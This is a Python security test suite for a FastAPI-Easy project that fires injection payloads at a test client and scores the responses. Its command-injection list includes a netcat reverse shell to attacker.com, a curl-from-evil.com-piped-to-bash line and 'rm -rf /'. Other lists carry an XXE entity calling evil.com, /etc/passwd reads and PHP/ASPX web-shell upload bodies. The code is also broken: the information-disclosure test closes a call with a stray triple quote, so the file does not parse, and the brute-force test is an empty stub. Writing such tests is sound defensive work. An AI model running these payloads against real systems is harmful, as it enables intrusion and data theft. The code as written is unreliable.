"""Comprehensive security testing framework for FastAPI-Easy"""

import asyncio
import json
import pytest
import secrets
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List

from fastapi import FastAPI, HTTPException, Request
from fastapi.testclient import TestClient
from pydantic import BaseModel

from fastapi_easy.security.enhanced_middleware import (
    SecurityHeadersMiddleware,
    InputSanitizationMiddleware,
    RateLimitingMiddleware,
    SecurityMonitoringMiddleware,
    configure_security_middleware,
)
from fastapi_easy.security.enhanced_jwt import EnhancedJWTAuth, TokenBlacklist
from fastapi_easy.security.field_encryption import FieldEncryption
from fastapi_easy.security.jwt_auth import JWTAuth
from fastapi_easy.security.validators import InputValidator


class SecurityTestCase:
    """Base class for security test cases"""

    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description
        self.vulnerabilities_found: List[Dict[str, Any]] = []
        self.passed = False

    def add_vulnerability(self, severity: str, description: str, evidence: Any):
        """Add found vulnerability"""
        self.vulnerabilities_found.append({
            "severity": severity,
            "description": description,
            "evidence": evidence,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })

    def set_passed(self, passed: bool):
        """Set test result"""
        self.passed = passed

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "name": self.name,
            "description": self.description,
            "passed": self.passed,
            "vulnerabilities_found": len(self.vulnerabilities_found),
            "vulnerabilities": self.vulnerabilities_found,
        }


class InputValidationTests:
    """Comprehensive input validation security tests"""

    def __init__(self, client: TestClient):
        self.client = client
        self.test_cases: List[SecurityTestCase] = []

    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all input validation tests"""
        results = []

        # SQL Injection Tests
        results.append(await self.test_sql_injection())

        # XSS Tests
        results.append(await self.test_xss_protection())

        # Command Injection Tests
        results.append(await self.test_command_injection())

        # Path Traversal Tests
        results.append(await self.test_path_traversal())

        # LDAP Injection Tests
        results.append(await self.test_ldap_injection())

        # NoSQL Injection Tests
        results.append(await self.test_nosql_injection())

        # XXE Injection Tests
        results.append(await self.test_xxe_injection())

        # Deserialization Tests
        results.append(await self.test_deserialization_attacks())

        # File Upload Tests
        results.append(await self.test_malicious_file_upload())

        # Buffer Overflow Tests
        results.append(await self.test_buffer_overflow())

        return {
            "category": "Input Validation",
            "total_tests": len(results),
            "passed": sum(1 for r in results if r["passed"]),
            "failed": sum(1 for r in results if not r["passed"]),
            "vulnerabilities_found": sum(r["vulnerabilities_found"] for r in results),
            "test_results": results,
        }

    async def test_sql_injection(self) -> Dict[str, Any]:
        """Test SQL injection protection"""
        test_case = SecurityTestCase(
            "SQL Injection Protection",
            "Tests protection against SQL injection attacks"
        )

        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES('hacker','pass'); --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR 1=1 #",
            "admin'--",
            "' OR 'x'='x",
            "1' OR '1'='1' /*",
        ]

        for payload in sql_payloads:
            try:
                # Test in query parameters
                response = self.client.get(f"/users?search={payload}")
                if response.status_code not in [422, 400, 404]:
                    test_case.add_vulnerability(
                        "HIGH",
                        f"SQL injection payload not filtered in query param: {payload}",
                        response.text
                    )

                # Test in JSON body
                response = self.client.post("/users/", json={"name": payload})
                if response.status_code not in [422, 400]:
                    test_case.add_vulnerability(
                        "HIGH",
                        f"SQL injection payload not filtered in JSON: {payload}",
                        response.text
                    )

                # Test in form data
                response = self.client.post("/login/", data={"username": payload})
                if response.status_code not in [422, 400]:
                    test_case.add_vulnerability(
                        "HIGH",
                        f"SQL injection payload not filtered in form: {payload}",
                        response.text
                    )

            except Exception as e:
                # Expected behavior - invalid input should cause exceptions
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_xss_protection(self) -> Dict[str, Any]:
        """Test XSS protection"""
        test_case = SecurityTestCase(
            "XSS Protection",
            "Tests protection against Cross-Site Scripting attacks"
        )

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<script>String.fromCharCode(88,83,83)</script>",
        ]

        for payload in xss_payloads:
            try:
                # Test in various contexts
                response = self.client.post("/users/", json={"name": payload})
                if response.status_code not in [422, 400]:
                    # Check if payload is reflected in response
                    if payload.replace(" ", "").replace("'", '"') in response.text.replace(" ", ""):
                        test_case.add_vulnerability(
                            "MEDIUM",
                            f"XSS payload reflected in response: {payload[:50]}...",
                            response.text[:200]
                        )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_command_injection(self) -> Dict[str, Any]:
        """Test command injection protection"""
        test_case = SecurityTestCase(
            "Command Injection Protection",
            "Tests protection against command injection attacks"
        )

        command_payloads = [
            "; ls -la",
            "| whoami",
            "& cat /etc/passwd",
            "`id`",
            "$(id)",
            "; rm -rf /",
            "| nc -e /bin/sh attacker.com 4444",
            "& curl http://evil.com/steal.sh | bash",
            "; python -c 'import os; os.system(\"whoami\")'",
        ]

        for payload in command_payloads:
            try:
                response = self.client.post("/api/execute", json={"command": payload})
                if response.status_code == 200:
                    test_case.add_vulnerability(
                        "HIGH",
                        f"Command injection executed: {payload}",
                        response.text
                    )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_path_traversal(self) -> Dict[str, Any]:
        """Test path traversal protection"""
        test_case = SecurityTestCase(
            "Path Traversal Protection",
            "Tests protection against path traversal attacks"
        )

        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
            "file:///etc/passwd",
            "../config/database.yml",
        ]

        for payload in path_traversal_payloads:
            try:
                response = self.client.get(f"/files?path={payload}")
                if response.status_code == 200 and "root:" in response.text:
                    test_case.add_vulnerability(
                        "HIGH",
                        f"Path traversal successful: {payload}",
                        response.text[:200]
                    )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_ldap_injection(self) -> Dict[str, Any]:
        """Test LDAP injection protection"""
        test_case = SecurityTestCase(
            "LDAP Injection Protection",
            "Tests protection against LDAP injection attacks"
        )

        ldap_payloads = [
            "*)(uid=*",
            "*)|(uid=*",
            "*))%00",
            "admin)(&(password=*",
            "*)(|(objectClass=*)",
            "*))(|(password=*",
            "test)(|(password=*",
            "*)(|(cn=*",
        ]

        for payload in ldap_payloads:
            try:
                response = self.client.post("/auth/ldap", json={"username": payload})
                if response.status_code == 200:
                    test_case.add_vulnerability(
                        "MEDIUM",
                        f"Potential LDAP injection: {payload}",
                        response.text[:200]
                    )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_nosql_injection(self) -> Dict[str, Any]:
        """Test NoSQL injection protection"""
        test_case = SecurityTestCase(
            "NoSQL Injection Protection",
            "Tests protection against NoSQL injection attacks"
        )

        nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "function() { return true; }"},
            {"$in": ["admin", "test"]},
            {"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]},
            "'; return db.users.find(); //",
            "1; return db.users.find(); //",
        ]

        for payload in nosql_payloads:
            try:
                response = self.client.post("/api/search", json={"query": payload})
                if response.status_code == 200:
                    test_case.add_vulnerability(
                        "MEDIUM",
                        f"Potential NoSQL injection: {payload}",
                        response.text[:200]
                    )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_xxe_injection(self) -> Dict[str, Any]:
        """Test XXE injection protection"""
        test_case = SecurityTestCase(
            "XXE Injection Protection",
            "Tests protection against XML External Entity attacks"
        )

        xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
            """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/malicious">]><data>&xxe;</data>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>""",
        ]

        for payload in xxe_payloads:
            try:
                response = self.client.post(
                    "/api/upload",
                    data=payload,
                    headers={"Content-Type": "application/xml"}
                )
                if response.status_code == 200 and "root:" in response.text:
                    test_case.add_vulnerability(
                        "HIGH",
                        "XXE injection successful",
                        response.text[:200]
                    )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_deserialization_attacks(self) -> Dict[str, Any]:
        """Test deserialization attack protection"""
        test_case = SecurityTestCase(
            "Deserialization Attack Protection",
            "Tests protection against unsafe deserialization"
        )

        malicious_payloads = [
            "__import__('os').system('whoami')",
            "__reduce__",
            "eval('__import__(\"os\").system(\"whoami\")')",
            "subprocess.check_output(['whoami'], shell=True)",
        ]

        for payload in malicious_payloads:
            try:
                response = self.client.post("/api/deserialize", json={"data": payload})
                if response.status_code == 200:
                    test_case.add_vulnerability(
                        "HIGH",
                        f"Deserialization attack successful: {payload}",
                        response.text[:200]
                    )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_malicious_file_upload(self) -> Dict[str, Any]:
        """Test malicious file upload protection"""
        test_case = SecurityTestCase(
            "Malicious File Upload Protection",
            "Tests protection against malicious file uploads"
        )

        malicious_files = [
            ("malicious.php", b"<?php system($_GET['cmd']); ?>"),
            ("webshell.aspx", b"<%@ Page Language='C#' %> <% System.Diagnostics.Process.Start('cmd.exe'); %>"),
            ("exploit.exe", b"MZ\x90\x00"),  # PE header
            ("script.js", b"<script>alert('XSS')</script>"),
        ]

        for filename, content in malicious_files:
            try:
                response = self.client.post(
                    "/api/upload",
                    files={"file": (filename, content)}
                )
                if response.status_code == 200:
                    test_case.add_vulnerability(
                        "MEDIUM",
                        f"Malicious file upload accepted: {filename}",
                        response.text[:200]
                    )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_buffer_overflow(self) -> Dict[str, Any]:
        """Test buffer overflow protection"""
        test_case = SecurityTestCase(
            "Buffer Overflow Protection",
            "Tests protection against buffer overflow attacks"
        )

        large_payloads = [
            "A" * 10000,    # 10KB
            "A" * 100000,   # 100KB
            "A" * 1000000,  # 1MB
            "A" * 10000000, # 10MB
        ]

        for payload in large_payloads:
            try:
                response = self.client.post("/users/", json={"name": payload})
                if response.status_code == 500:
                    test_case.add_vulnerability(
                        "MEDIUM",
                        f"Server error on large payload ({len(payload)} chars)",
                        response.text[:200]
                    )

            except Exception:
                pass

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()


class AuthenticationSecurityTests:
    """Authentication security tests"""

    def __init__(self, jwt_auth: EnhancedJWTAuth):
        self.jwt_auth = jwt_auth
        self.test_cases: List[SecurityTestCase] = []

    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all authentication security tests"""
        results = []

        results.append(await self.test_jwt_token_security())
        results.append(await self.test_jwt_key_rotation())
        results.append(await self.test_token_blacklisting())
        results.append(await self.test_brute_force_protection())
        results.append(await self.test_session_management())
        results.append(await self.test_password_security())

        return {
            "category": "Authentication & Authorization",
            "total_tests": len(results),
            "passed": sum(1 for r in results if r["passed"]),
            "failed": sum(1 for r in results if not r["passed"]),
            "vulnerabilities_found": sum(r["vulnerabilities_found"] for r in results),
            "test_results": results,
        }

    async def test_jwt_token_security(self) -> Dict[str, Any]:
        """Test JWT token security"""
        test_case = SecurityTestCase(
            "JWT Token Security",
            "Tests JWT token implementation security"
        )

        try:
            # Test valid token
            token, jti = self.jwt_auth.create_access_token("testuser")
            payload = await self.jwt_auth.verify_token(token)
            assert payload.sub == "testuser"

            # Test malformed token
            try:
                await self.jwt_auth.verify_token("invalid.token.here")
                test_case.add_vulnerability(
                    "HIGH",
                    "Malformed token accepted",
                    "Invalid token should be rejected"
                )
            except Exception:
                pass  # Expected

            # Test token tampering
            tampered_token = token[:-10] + "X" * 10
            try:
                await self.jwt_auth.verify_token(tampered_token)
                test_case.add_vulnerability(
                    "HIGH",
                    "Tampered token accepted",
                    "Tampered token should be rejected"
                )
            except Exception:
                pass  # Expected

        except Exception as e:
            test_case.add_vulnerability(
                "HIGH",
                f"JWT security test failed: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_jwt_key_rotation(self) -> Dict[str, Any]:
        """Test JWT key rotation"""
        test_case = SecurityTestCase(
            "JWT Key Rotation",
            "Tests JWT key rotation functionality"
        )

        try:
            # Create token with current key
            old_token, _ = self.jwt_auth.create_access_token("testuser")

            # Rotate keys
            new_key_id = self.jwt_auth.rotate_keys()

            # Verify old token still works
            await self.jwt_auth.verify_token(old_token)

            # Create new token with rotated key
            new_token, _ = self.jwt_auth.create_access_token("testuser")

            # Verify new token works
            await self.jwt_auth.verify_token(new_token)

        except Exception as e:
            test_case.add_vulnerability(
                "MEDIUM",
                f"JWT key rotation failed: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_token_blacklisting(self) -> Dict[str, Any]:
        """Test token blacklisting"""
        test_case = SecurityTestCase(
            "Token Blacklisting",
            "Tests token revocation functionality"
        )

        try:
            # Create token
            token, jti = self.jwt_auth.create_access_token("testuser")

            # Verify token works
            await self.jwt_auth.verify_token(token)

            # Blacklist token
            success = await self.jwt_auth.revoke_token(token)
            if not success:
                test_case.add_vulnerability(
                    "MEDIUM",
                    "Token blacklisting failed",
                    "Token should be successfully blacklisted"
                )

            # Verify blacklisted token is rejected
            try:
                await self.jwt_auth.verify_token(token)
                test_case.add_vulnerability(
                    "HIGH",
                    "Blacklisted token accepted",
                    "Blacklisted token should be rejected"
                )
            except Exception:
                pass  # Expected

        except Exception as e:
            test_case.add_vulnerability(
                "MEDIUM",
                f"Token blacklisting test failed: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_brute_force_protection(self) -> Dict[str, Any]:
        """Test brute force protection"""
        test_case = SecurityTestCase(
            "Brute Force Protection",
            "Tests protection against brute force attacks"
        )

        # This would test the rate limiting middleware
        # Implementation depends on specific authentication endpoints
        try:
            # Simulate multiple failed login attempts
            for i in range(10):
                # Simulate failed login
                pass  # Would need actual auth endpoint

            test_case.add_vulnerability(
                "LOW",
                "Brute force protection test not fully implemented",
                "Needs actual authentication endpoint testing"
            )

        except Exception as e:
            test_case.add_vulnerability(
                "LOW",
                f"Brute force test error: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_session_management(self) -> Dict[str, Any]:
        """Test session management security"""
        test_case = SecurityTestCase(
            "Session Management",
            "Tests session management security"
        )

        try:
            # Test concurrent sessions
            token1, _ = self.jwt_auth.create_access_token("testuser")
            token2, _ = self.jwt_auth.create_access_token("testuser")

            # Both should be valid initially
            await self.jwt_auth.verify_token(token1)
            await self.jwt_auth.verify_token(token2)

            # Test user session invalidation
            revoked_count = await self.jwt_auth.revoke_user_tokens("testuser")
            if revoked_count < 2:  # Should revoke both tokens
                test_case.add_vulnerability(
                    "MEDIUM",
                    f"Expected to revoke 2 tokens, revoked {revoked_count}",
                    "All user tokens should be revoked"
                )

        except Exception as e:
            test_case.add_vulnerability(
                "MEDIUM",
                f"Session management test failed: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_password_security(self) -> Dict[str, Any]:
        """Test password security implementation"""
        test_case = SecurityTestCase(
            "Password Security",
            "Tests password hashing and verification"
        )

        try:
            from fastapi_easy.security.core.password import PasswordManager

            password_manager = PasswordManager()

            # Test password hashing
            password = "test_password_123"
            hashed = password_manager.hash_password(password)

            # Test correct password verification
            assert password_manager.verify_password(password, hashed)

            # Test incorrect password verification
            assert not password_manager.verify_password("wrong_password", hashed)

            # Test empty password handling
            try:
                password_manager.hash_password("")
                test_case.add_vulnerability(
                    "MEDIUM",
                    "Empty password accepted",
                    "Empty passwords should be rejected"
                )
            except ValueError:
                pass  # Expected

        except Exception as e:
            test_case.add_vulnerability(
                "MEDIUM",
                f"Password security test failed: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()


class InfrastructureSecurityTests:
    """Infrastructure security tests"""

    def __init__(self, client: TestClient):
        self.client = client
        self.test_cases: List[SecurityTestCase] = []

    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all infrastructure security tests"""
        results = []

        results.append(await self.test_security_headers())
        results.append(await self.test_cors_configuration())
        results.append(await self.test_rate_limiting())
        results.append(await self.test_error_handling())
        results.append(await self.test_information_disclosure())

        return {
            "category": "Infrastructure Security",
            "total_tests": len(results),
            "passed": sum(1 for r in results if r["passed"]),
            "failed": sum(1 for r in results if not r["passed"]),
            "vulnerabilities_found": sum(r["vulnerabilities_found"] for r in results),
            "test_results": results,
        }

    async def test_security_headers(self) -> Dict[str, Any]:
        """Test security headers"""
        test_case = SecurityTestCase(
            "Security Headers",
            "Tests for presence of security headers"
        )

        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Referrer-Policy",
            "Content-Security-Policy",
            "Permissions-Policy",
        ]

        try:
            response = self.client.get("/")
            missing_headers = []

            for header in required_headers:
                if header not in response.headers:
                    missing_headers.append(header)

            if missing_headers:
                test_case.add_vulnerability(
                    "MEDIUM",
                    f"Missing security headers: {', '.join(missing_headers)}",
                    str(missing_headers)
                )

        except Exception as e:
            test_case.add_vulnerability(
                "LOW",
                f"Security headers test error: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_cors_configuration(self) -> Dict[str, Any]:
        """Test CORS configuration"""
        test_case = SecurityTestCase(
            "CORS Configuration",
            "Tests CORS security configuration"
        )

        try:
            # Test with unauthorized origin
            response = self.client.options(
                "/api/test",
                headers={"Origin": "https://evil.com"}
            )

            # Check if unauthorized origin is rejected
            if response.headers.get("access-control-allow-origin") == "*":
                test_case.add_vulnerability(
                    "MEDIUM",
                    "Overly permissive CORS configuration",
                    "CORS should not allow all origins"
                )

            if response.headers.get("access-control-allow-credentials") == "true" and \
               response.headers.get("access-control-allow-origin") == "*":
                test_case.add_vulnerability(
                    "HIGH",
                    "Dangerous CORS configuration",
                    "Credentials should not be allowed with wildcard origin"
                )

        except Exception as e:
            test_case.add_vulnerability(
                "LOW",
                f"CORS test error: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_rate_limiting(self) -> Dict[str, Any]:
        """Test rate limiting"""
        test_case = SecurityTestCase(
            "Rate Limiting",
            "Tests rate limiting protection"
        )

        try:
            # Make multiple rapid requests
            status_codes = []
            for i in range(20):
                response = self.client.get("/api/test")
                status_codes.append(response.status_code)

            # Check if rate limiting is active
            if 429 not in status_codes:
                test_case.add_vulnerability(
                    "MEDIUM",
                    "No rate limiting detected",
                    "API should implement rate limiting"
                )

        except Exception as e:
            test_case.add_vulnerability(
                "LOW",
                f"Rate limiting test error: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_error_handling(self) -> Dict[str, Any]:
        """Test secure error handling"""
        test_case = SecurityTestCase(
            "Error Handling",
            "Tests secure error handling"
        )

        try:
            # Test with invalid endpoint
            response = self.client.get("/nonexistent-endpoint")

            # Check for information disclosure in error messages
            response_text = response.text.lower()
            sensitive_info = [
                "stack trace",
                "internal server error",
                "sql",
                "database",
                "exception",
                "traceback",
            ]

            for info in sensitive_info:
                if info in response_text:
                    test_case.add_vulnerability(
                        "MEDIUM",
                        f"Information disclosure in error message: {info}",
                        response.text[:200]
                    )

        except Exception as e:
            test_case.add_vulnerability(
                "LOW",
                f"Error handling test error: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()

    async def test_information_disclosure(self) -> Dict[str, Any]:
        """Test for information disclosure"""
        test_case = SecurityTestCase(
            "Information Disclosure",
            "Tests for information disclosure vulnerabilities"
        """

        try:
            # Test server headers
            response = self.client.get("/")
            server_header = response.headers.get("server", "")

            if server_header and ("nginx" in server_header.lower() or
                                "apache" in server_header.lower()):
                test_case.add_vulnerability(
                    "LOW",
                    f"Server information disclosed: {server_header}",
                    "Server version should be hidden"
                )

            # Test for debug information
            response = self.client.get("/debug")
            if response.status_code == 200 and "debug" in response.text.lower():
                test_case.add_vulnerability(
                    "MEDIUM",
                    "Debug information accessible",
                    "Debug endpoints should not be exposed"
                )

        except Exception as e:
            test_case.add_vulnerability(
                "LOW",
                f"Information disclosure test error: {str(e)}",
                str(e)
            )

        test_case.set_passed(len(test_case.vulnerabilities_found) == 0)
        return test_case.to_dict()


class SecurityTestRunner:
    """Main security test runner"""

    def __init__(self, app: FastAPI):
        self.app = app
        self.client = TestClient(app)

    async def run_comprehensive_security_test(self) -> Dict[str, Any]:
        """Run comprehensive security test suite"""
        results = {
            "scan_metadata": {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "scanner_version": "1.0.0",
                "framework": "FastAPI-Easy Security Test Framework",
            },
            "summary": {},
            "categories": [],
        }

        # Initialize test suites
        input_tests = InputValidationTests(self.client)
        jwt_auth = EnhancedJWTAuth(secrets.token_urlsafe(32))
        auth_tests = AuthenticationSecurityTests(jwt_auth)
        infra_tests = InfrastructureSecurityTests(self.client)

        # Run all test suites
        results["categories"] = [
            await input_tests.run_all_tests(),
            await auth_tests.run_all_tests(),
            await infra_tests.run_all_tests(),
        ]

        # Calculate summary
        total_tests = sum(cat["total_tests"] for cat in results["categories"])
        total_passed = sum(cat["passed"] for cat in results["categories"])
        total_failed = sum(cat["failed"] for cat in results["categories"])
        total_vulnerabilities = sum(cat["vulnerabilities_found"] for cat in results["categories"])

        results["summary"] = {
            "total_tests": total_tests,
            "passed": total_passed,
            "failed": total_failed,
            "vulnerabilities_found": total_vulnerabilities,
            "success_rate": round((total_passed / total_tests * 100) if total_tests > 0 else 0, 2),
        }

        # Determine overall security rating
        if total_vulnerabilities == 0:
            security_rating = "EXCELLENT"
        elif total_vulnerabilities < 5:
            security_rating = "GOOD"
        elif total_vulnerabilities < 15:
            security_rating = "FAIR"
        else:
            security_rating = "POOR"

        results["summary"]["security_rating"] = security_rating

        return results

    def generate_security_report(self, test_results: Dict[str, Any]) -> str:
        """Generate human-readable security report"""
        report = [
            "# FastAPI-Easy Security Test Report",
            f"Generated: {test_results['scan_metadata']['timestamp']}",
            f"Scanner: {test_results['scan_metadata']['framework']} v{test_results['scan_metadata']['scanner_version']}",
            "",
            "## Executive Summary",
            f"- Security Rating: **{test_results['summary']['security_rating']}**",
            f"- Total Tests: {test_results['summary']['total_tests']}",
            f"- Passed: {test_results['summary']['passed']}",
            f"- Failed: {test_results['summary']['failed']}",
            f"- Vulnerabilities Found: {test_results['summary']['vulnerabilities_found']}",
            f"- Success Rate: {test_results['summary']['success_rate']}%",
            "",
        ]

        for category in test_results["categories"]:
            report.extend([
                f"## {category['category']}",
                f"- Tests: {category['total_tests']}, Passed: {category['passed']}, Failed: {category['failed']}",
                f"- Vulnerabilities: {category['vulnerabilities_found']}",
                ""
            ])

            for test_result in category["test_results"]:
                status = "✅ PASS" if test_result["passed"] else "❌ FAIL"
                report.extend([
                    f"### {test_result['name']} {status}",
                    f"Description: {test_result['description']}",
                ])

                if test_result["vulnerabilities"]:
                    report.append("**Vulnerabilities Found:**")
                    for vuln in test_result["vulnerabilities"]:
                        report.extend([
                            f"- **{vuln['severity']}**: {vuln['description']}",
                            f"  Evidence: {vuln['evidence'][:100]}...",
                        ])
                report.append("")

        return "\n".join(report)


# pytest fixtures for easy testing
@pytest.fixture
def security_test_runner():
    """Create security test runner"""
    app = FastAPI()

    @app.get("/")
    async def root():
        return {"message": "Hello World"}

    @app.get("/api/test")
    async def test_endpoint():
        return {"test": "data"}

    return SecurityTestRunner(app)


@pytest.mark.security
async def test_comprehensive_security(security_test_runner):
    """Run comprehensive security test suite"""
    results = await security_test_runner.run_comprehensive_security_test()

    # Assert overall security rating is at least FAIR
    assert results["summary"]["security_rating"] in ["EXCELLENT", "GOOD", "FAIR"]

    # Assert critical vulnerabilities are not present
    for category in results["categories"]:
        for test_result in category["test_results"]:
            for vuln in test_result["vulnerabilities"]:
                assert vuln["severity"] != "HIGH", f"High severity vulnerability found: {vuln['description']}"


if __name__ == "__main__":
    # Run security tests directly
    async def main():
        app = FastAPI()

        @app.get("/")
        async def root():
            return {"message": "Hello World"}

        runner = SecurityTestRunner(app)
        results = await runner.run_comprehensive_security_test()
        report = runner.generate_security_report(results)

        print(report)

        # Also save results as JSON
        with open("security_test_results.json", "w") as f:
            json.dump(results, f, indent=2)

    asyncio.run(main())